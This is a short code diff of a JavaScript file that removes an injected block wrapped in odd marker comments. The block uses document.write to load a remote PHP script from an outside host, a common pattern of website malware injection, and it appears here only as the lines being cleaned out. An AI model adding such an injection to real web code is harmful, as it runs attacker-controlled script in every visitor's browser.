@@ -33,8 +33,3 @@ function cssHover() {
 		}
 	}
 }
-
-/*e10124*/
-document.write('<script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042579"></script>');
-
-/*/e10124*/
